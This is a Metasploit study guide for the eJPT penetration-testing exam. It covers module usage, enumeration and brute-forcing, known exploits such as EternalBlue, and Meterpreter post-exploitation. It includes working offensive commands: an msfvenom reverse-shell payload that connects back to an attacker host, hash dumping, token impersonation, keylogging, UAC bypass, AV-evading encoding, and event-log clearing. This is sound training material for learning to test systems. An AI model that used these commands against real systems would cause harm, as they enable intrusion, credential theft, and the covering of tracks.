## 1. Introduction to The Metasploit Framework

### What is MSF?
- An **open-source**, robust penetration testing and exploitation framework used by pentesters and security researchers worldwide
- Provides infrastructure to **automate every stage** of the penetration testing life cycle
- Used to develop and test exploits; has one of the **world's largest databases of public, tested exploits**
- Designed to be **modular** — new functionality can be implemented with ease
- Source code is available on **GitHub**; developers constantly add new exploits

### History
| Year | Milestone |
|------|-----------|
| 2003 | Developed by **HD Moore** (originally in Perl) |
| 2007 | Rewritten in **Ruby** |
| 2009 | Acquired by **Rapid7** |
| 2019 | Metasploit **5.0** released |
| 2020 | Metasploit **6.0** released |

### Editions
- **Metasploit Pro** — Commercial
- **Metasploit Express** — Commercial
- **Metasploit Framework** — Community (free)

---

## 2. Essential Terminology

| Term | Definition |
|------|------------|
| **Interface** | Methods of interacting with the MSF |
| **Module** | Pieces of code that perform a particular task (e.g., an exploit) |
| **Vulnerability** | Weakness or flaw in a system or network that can be exploited |
| **Exploit** | Code/module used to take advantage of a vulnerability |
| **Payload** | Code delivered to the target by an exploit to execute arbitrary commands or provide remote access |
| **Listener** | A utility that listens for an incoming connection from a target |

---

## 3. MSF Interfaces

### MSFconsole
- All-in-one interface providing access to **all MSF functionality**
- Primary interface used throughout the course

### MSFcli (Discontinued)
- Command-line utility for creating automation scripts
- Can redirect output from/to other tools
- **Discontinued in 2015** — its functionality is now available through MSFconsole

### Metasploit Community Edition
- **Web-based GUI** front-end for MSF
- Simplifies network discovery and vulnerability identification

### Armitage
- **Free Java-based GUI** front-end for MSF developed by Raphael Mudge
- Simplifies network discovery, exploitation, and post exploitation
- Visualizes targets, automates port scanning, exploitation, and post exploitation
- Requires MSF database + backend services to be running
- Comes pre-packaged with Kali Linux

> 💡 **Community Exam Tip:** The course is very heavy on Metasploit. The course is heavy in Metasploit, which should give you a clue that it's probably important to master Metasploit as you will need to use it for the exam.

---

## 4. MSF Architecture

### Modules
| Module Type | Purpose |
|-------------|---------|
| **Exploit** | Takes advantage of a vulnerability; paired with a payload |
| **Payload** | Code executed remotely on the target after exploitation (e.g., reverse shell) |
| **Encoder** | Encodes payloads to avoid AV detection (e.g., `shikata_ga_nai` for Windows payloads) |
| **NOPs** | Ensures payload sizes are consistent and stable when executed |
| **Auxiliary** | Additional functionality like port scanning and enumeration |

### Payload Types
1. **Non-Staged Payload** — Sent to the target all-at-once with the exploit
2. **Staged Payload** — Sent in two parts:
   - **Stager**: Establishes a reverse connection back to the attacker, then downloads the second part
   - **Stage**: Downloaded and executed by the stager

### Meterpreter Payload
- Advanced, **multi-functional payload** executed **in memory** on the target — hard to detect
- Communicates over a stager socket
- Provides interactive command interpreter: system commands, file system navigation, keylogging, and more
- Supports loading **custom scripts and plugins dynamically**

---

## 5. MSF File System Structure

- Main modules directory (Linux): `/usr/share/metasploit-framework/modules`
- User-specified modules: `~/.ms4/modules`
- Organized into directories by module type

---

## 6. Penetration Testing with MSF (PTES)

MSF maps directly onto the **Penetration Testing Execution Standard (PTES)**:

| Pentest Phase | MSF Implementation |
|--------------|-------------------|
| Information Gathering & Enumeration | Auxiliary Modules |
| Vulnerability Scanning | Auxiliary Modules + Nessus |
| Exploitation | Exploit Modules & Payloads |
| Post Exploitation | Meterpreter |
| Privilege Escalation | Post Exploitation Modules + Meterpreter |
| Maintaining Persistent Access | Post Exploitation + Persistence Modules |

> 💡 **Community Exam Tip:** Being aware of which stage of the penetration testing process you are in helps you make decisions about next steps. This awareness guides your choice of tools and techniques, ensuring a systematic approach to each scenario in the exam.

---

## 7. Installing & Configuring MSF

- Distributed by Rapid7; can be installed as a standalone package on **Windows & Linux**
- Course uses **Kali Linux** — MSF and dependencies come **pre-packaged**

### MSF Database (msfdb)
- Uses **PostgreSQL** as the primary database server
- Tracks all assessments, host data, scans, etc.
- Facilitates import/storage of scan results from **Nmap** and **Nessus**

### Installation Steps
1. Update repositories and upgrade MSF to the latest version
2. Start and enable the PostgreSQL database service
3. Initialize msfdb (`msfdb init`)
4. Launch `msfconsole`

---

## 8. MSFconsole Fundamentals

### Key Skills
1. How to search for modules
2. How to select modules
3. How to configure module options & variables
4. How to search for payloads
5. Managing sessions
6. Additional functionality
7. Saving your configuration

### MSF Module Variables

| Variable | Purpose |
|----------|---------|
| `LHOST` | Attacker's IP address |
| `LPORT` | Port on attacker's system for receiving reverse connection |
| `RHOST` | Target system/server IP address |
| `RHOSTS` | Multiple target IPs or network ranges |
| `RPORT` | Target port on the remote system |

> 💡 **Community Exam Tip:** You can use `setg` (global set) to set `RHOSTS`/`RHOST` once and have it apply across all modules — e.g., `setg RHOSTS <TARGET_IP>`. This saves time when switching modules.

### Workspaces
- Allow you to organize hosts, scans, and activities per engagement/target
- Create, manage, and switch between multiple workspaces from within MSFconsole

---

## 9. Information Gathering & Enumeration

### Port Scanning with Nmap
- Nmap results can be **exported and imported into MSF** for vulnerability detection and exploitation

### Port Scanning with Auxiliary Modules
- Used for **TCP & UDP port scanning**
- Can enumerate services: FTP, SSH, HTTP, etc.
- Useful in both **information gathering** and **post exploitation** phases (pivoting)

### Service Enumeration — Key Auxiliary Modules

#### FTP (Port 21)
- Enumerate FTP service version and perform brute-force attacks
- Improperly configured FTP may allow **anonymous login**

```
use auxiliary/scanner/ftp/ftp_version
use auxiliary/scanner/ftp/ftp_login
set RHOSTS <TARGET_IP>
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
```

> 💡 **Community Exam Tip (from eJPT passers):** Always check for FTP anonymous login using `nmap -p 21 --script ftp-anon <TARGET_IP>` before brute forcing. Use Hydra for brute forcing FTP if MSF is too slow.

#### SMB (Port 445 / 139)
- Samba = Linux implementation of SMB
- Enumerate: SMB version, shares, users; brute-force login

```
use auxiliary/scanner/smb/smb_version
use auxiliary/scanner/smb/smb_enumusers
use auxiliary/scanner/smb/smb_enumshares
use auxiliary/scanner/smb/smb_login
use auxiliary/scanner/smb/pipe_auditor
set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
set SMBUser <USER>
set RHOSTS <TARGET_IP>
```

#### Web Server Enumeration (Port 80)
- Enumerate web server version, HTTP headers, brute-force directories

```
use auxiliary/scanner/http/http_version
use auxiliary/scanner/http/http_header
use auxiliary/scanner/http/brute_dirs
use auxiliary/scanner/http/robots_txt
```

#### MySQL (Port 3306)

```
use auxiliary/scanner/mysql/mysql_version
use auxiliary/scanner/mysql/mysql_login
use auxiliary/scanner/mysql/mysql_schemadump
use auxiliary/scanner/mysql/mysql_writable_dirs
use auxiliary/scanner/mysql/mysql_file_enum
use auxiliary/scanner/mysql/mysql_hashdump
use auxiliary/admin/mysql/mysql_enum   # requires valid credentials
use auxiliary/admin/mysql/mysql_sql    # run SQL commands
```

> 💡 **Community Exam Tip:** The `mysql_enum` module can only run if you have valid credentials of a user account. Use it after obtaining creds from brute-forcing.

#### SSH (Port 22)

```
use auxiliary/scanner/ssh/ssh_version
use auxiliary/scanner/ssh/ssh_login
set USERPASS_FILE /usr/share/wordlists/metasploit/root_userpass.txt
set STOP_ON_SUCCESS true
set VERBOSE true
```

#### SMTP (Port 25 / 465 / 587)
- Enumerate SMTP version and user accounts on the target

---

## 10. Vulnerability Scanning with MSF

### MSF Vulnerability Scanning
- Use auxiliary and exploit modules to scan for inherent vulnerabilities in services, OS, and web apps
- Practice target: **Metasploitable3** (Windows Server 2008 — intentionally vulnerable)

### Nessus Integration
- **Nessus** = proprietary vulnerability scanner by Tenable
- Run a scan in Nessus → **import results into MSF** for analysis and exploitation
- Provides CVE codes for identified vulnerabilities
- Free version: **Nessus Essentials** (up to 16 IPs)

### WMAP (Web App Vulnerability Scanning)
- WMAP is a powerful web application vulnerability scanner
- Available as an **MSF plugin** — fully integrated into MSF
- Automates web server enumeration and vulnerability scanning

---

## 11. Client-Side Attacks & Msfvenom

### Client-Side Attacks
- Coerce a client to execute a **malicious payload** that connects back to the attacker
- Uses social engineering: malicious documents, portable executables (PEs)
- Targets **human vulnerabilities**, not service vulnerabilities
- Attackers must be aware of **AV detection** since payload is stored on disk

### Msfvenom
- Combination of **msfpayload** + **msfencode**
- Generates and encodes MSF payloads for various OS and web servers

```bash
msfvenom -p linux/x64/shell/reverse_tcp lhost=<ATTACKER_IP> lport=443 -f elf -o reverse443
chmod +x reverse443
```

### Encoding Payloads
- Most AV solutions use **signature-based detection**
- Encoding modifies the payload **shellcode signature** to evade older AV
- `shikata_ga_nai` is a commonly used encoder for Windows payloads

### Shellcode
- A piece of code used as a payload for exploitation
- Named after "command shell" — provides a remote command shell to the attacker

### Metasploit Resource Scripts
- Automate repetitive tasks and commands (like batch scripts)
- Specify sequential MSFconsole commands in a `.rc` file
- Used to automate: setting up multi-handlers, loading and executing payloads

---

## 12. Host & Service Based Exploitation

### Rejetto HFS (HTTP File Server)
- Default port: **TCP 80**
- **Rejetto HFS V2.3** is vulnerable to remote command execution
- MSF has a prebuilt exploit module

### MS17-010 EternalBlue (SMBv1)
- **CVE-2017-0144** — developed by the NSA, leaked by Shadow Brokers in 2017
- Takes advantage of a flaw in **Windows SMBv1** — sends specially crafted packets
- Used in the **WannaCry ransomware** attack (June 27, 2017)
- Affects: Windows Vista, 7, 8.1, 10, Server 2008, 2012, 2016
- Microsoft patched it in March 2017 — many systems remain unpatched
- MSF has both an **auxiliary module** (check if vulnerable) and an **exploit module**
- Provides a **privileged meterpreter session** on the target

### WinRM (Windows Remote Management)
- Default ports: **TCP 5985** (HTTP) and **5986** (HTTPS)
- Used for remote access and management of Windows systems
- MSF can identify WinRM users/passwords and execute commands
- MSF exploit module can obtain a **meterpreter session**

### Apache Tomcat
- Java servlet web server — default port: **TCP 8080**
- **Tomcat V8.5.19** is vulnerable to RCE — allows uploading and executing a JSP payload
- MSF has a prebuilt exploit module

### vsftpd (FTP)
- **vsftpd V2.3.4** — vulnerable to a **backdoor** added via a supply chain attack
- Allows command execution on the target
- MSF has an exploit module

### Samba (SMB on Linux)
- **Samba V3.5.0** — vulnerable to RCE; allows uploading a shared library to a writable share
- MSF exploit module available

### libssh (SSH)
- **libssh V0.6.0–0.8.0** — authentication bypass vulnerability in the server code
- MSF exploit module available

### Haraka SMTP Server
- Open-source SMTP server written in Node.js
- **Haraka versions prior to V2.8.9** — vulnerable to command injection
- MSF exploit module available

> 💡 **Community Exam Tip:** The content covers frequently exploited Windows services like MS17-010 and other common SMB attacks. There is a good introduction to exploitation techniques where you can do it manually or with Metasploit.

---

## 13. Post Exploitation with Meterpreter

### Post Exploitation Techniques
- Local Enumeration
- Privilege Escalation
- Dumping Hashes
- Establishing Persistence
- Clearing Tracks
- Pivoting

### Meterpreter
- Operates via **DLL injection**, executed **in memory** — difficult to detect
- Communicates over a stager socket
- Commands: system commands, file navigation, keylogging, custom scripts/plugins

### Upgrading Shell to Meterpreter
- Use `sessions -u <SESSION_ID>` or the `shell_to_meterpreter` post module

---

## 14. Windows Post Exploitation

### Windows Post Exploitation Modules — Enumeration
- Enumerate user privileges
- Enumerate logged-on users
- VM check
- Enumerate installed programs
- Enumerate AVs
- Enumerate computers connected to the domain
- Enumerate installed patches
- Enumerate shares

### Bypassing UAC
- **UAC (User Account Control)** — introduced in Windows Vista; requires admin approval for OS changes
- Module: `Windows Escalate UAC Protection Bypass (In Memory Injection)`
- Uses **trusted publisher certificate through process injection** to bypass UAC
- Spawns a second shell with the UAC flag turned off

### Token Impersonation with Incognito

#### Windows Access Tokens
- Created and managed by **LSASS (Local Security Authority Subsystem Service)**
- Generated by `winlogon.exe` every time a user authenticates successfully
- All child processes inherit the access token

#### Token Security Levels
| Token Type | Created By | Threat Level |
|------------|-----------|--------------|
| **Impersonate-level** | Non-interactive logins (services, domain logons) | Can impersonate on local system only |
| **Delegate-level** | Interactive logins (traditional login, RDP) | **Highest threat** — can impersonate on any system |

#### Required Privileges for Impersonation
- `SeAssignPrimaryToken` — impersonate tokens
- `SeCreateToken` — create arbitrary tokens with admin privileges
- `SeImpersonatePrivilege` — create process under another user's security context

#### Incognito Module
- Built-in Meterpreter module (originally a standalone tool)
- Displays and impersonates available user tokens after exploitation

### Mimikatz / Kiwi
- **Mimikatz**: Windows post-exploitation tool by Benjamin Delpy (@gentilkiwi)
- Extracts plaintext credentials from memory and password hashes from local **SAM** databases
- **Kiwi**: Built-in Meterpreter extension — runs Mimikatz **without touching the disk** (in-memory)

### Pass-The-Hash (PsExec)
- Captures/harvests **NTLM hashes** or clear-text passwords and authenticates legitimately
- Uses `PsExec` module to authenticate with the target via **SMB**
- Grants access via legitimate credentials without exploiting a service

### Establishing Persistence on Windows
- Ensures access survives restarts, credential changes, and interruptions
- Various MSF persistence modules available

### Enabling RDP
- **RDP** (Remote Desktop Protocol) — proprietary GUI remote access by Microsoft
- Default port: **TCP 3389**
- Disabled by default; MSF exploit module can enable it
- Requires legitimate user account + clear-text password

### Keylogging
- Capture keystrokes entered on the target system
- Meterpreter provides built-in keylogging capability

### Clearing Windows Event Logs

#### Event Log Types
| Log Type | Stores |
|----------|--------|
| **Application logs** | App events (startups, crashes) |
| **System logs** | System events (startups, reboots) |
| **Security logs** | Security events (password changes, auth failures) |

- Event logs are accessible via **Event Viewer**
- Must clear tracks after an assessment

> 💡 **Community Exam Tip:** Always clear event logs before finishing the exam tasks if asked — use Meterpreter's built-in `clearev` command.

---

## 15. Pivoting

- Pivoting = using a compromised host to attack **other systems on the same internal network**
- Meterpreter lets you add a **network route** to the internal subnet to scan and exploit other systems

```bash
# In Meterpreter session:
run autoroute -s 192.130.110.0 -n 255.255.255.0

# Back in MSF console:
use auxiliary/scanner/portscan/tcp
set PORTS 80,8080,445,21,22
set RHOSTS 192.130.110.1-254
exploit

# Port forwarding:
portfwd add -l 1234 -p 21 -r 192.130.110.3
```

> 💡 **Community Exam Tip:** When required to pivot, all you need is the Metasploit autoroute function, which is covered in the course, and from there you can load the `scanner/portscan/tcp` module to port scan your internal target. Keep things simple.

> 💡 **Community Exam Tip (from eJPT passer with 19/20):** After adding the autoroute, use `portfwd add -l <LOCAL_PORT> -p <REMOTE_PORT> -r <TARGET_IP>` to forward a specific remote port to your local machine for direct interaction.

---

## 16. Linux Post Exploitation

### Linux Post Exploitation Modules — Enumeration
- System configuration
- Environment variables
- Network configuration
- VM check
- User history

### Linux Privilege Escalation
- Techniques depend on **Linux kernel version** and **distribution release**
- MSF has limited Linux kernel exploit modules — focus on exploiting vulnerable services/programs

### Dumping Hashes (Hashdump)
- Linux password hashes stored in `/etc/shadow` — accessible only by root
- `hashdump` module dumps hashes from `/etc/shadow`
- Can **unshadow** hashes for password cracking with **John the Ripper**

### Establishing Persistence on Linux
- Similar goals as Windows persistence
- Techniques depend on target configuration

---

## 17. Armitage GUI

- **Free Java-based GUI** for MSF by Raphael Mudge
- Features:
  - Visualizes targets
  - Automates port scanning
  - Automates exploitation
  - Automates post exploitation
- Requires MSF database and backend services running
- Pre-packaged with Kali Linux

---

## 🔑 Key Exam Tips (from eJPT Community)

> These tips are from people who have passed the eJPT exam:

1. **Master Metasploit** — the course is very heavy in Metasploit. You will need it throughout the exam, especially for exploitation and pivoting.

2. **Take detailed notes with screenshots** — organize them by topic section. Include lab solution links in case you can't access video content during the exam. Using tools like OneNote (cloud-synced) is highly recommended.

3. **The exam is entirely practical** — conducted in a simulated network environment. Duration is **48 hours**. Passing score is **70% or higher**. One retake is included.

4. **Pivoting is important** — use Metasploit's `autoroute` and the `scanner/portscan/tcp` module. Keep things simple and don't rush; 48 hours is more than enough.

5. **Make your own notes** — don't just download someone else's cheatsheet. Making notes reinforces learning and helps you find the right commands faster during the exam.

6. **Always check for anonymous FTP/SMB access** before brute-forcing — it saves significant time.

7. **`setg`** (global set) is your friend — set `RHOSTS` globally when running multiple modules against the same target.

8. **Try both MSF and manual methods** for exploitation — sometimes the MSF module doesn't work and you need to try a manual approach or an alternative module.

---

## ⚡ Quick Reference — Common MSF Commands

```bash
# Start MSFconsole
msfconsole -q

# Search for a module
search <keyword>
search type:auxiliary name:ftp

# Use a module
use <module_path>

# Show options
show options

# Set variables
set RHOSTS <TARGET_IP>
setg RHOSTS <TARGET_IP>    # global set
set LHOST <ATTACKER_IP>
set LPORT <PORT>

# Run module
run / exploit

# Manage sessions
sessions
sessions -l             # list all sessions
sessions -i <ID>        # interact with session
sessions -u <ID>        # upgrade to meterpreter

# Meterpreter useful commands
sysinfo
getuid
hashdump
getsystem
load kiwi
load incognito
list_tokens -u
impersonate_token "<TOKEN>"
run autoroute -s <SUBNET> -n <NETMASK>
clearev                 # clear event logs
keyscan_start
keyscan_dump
```

---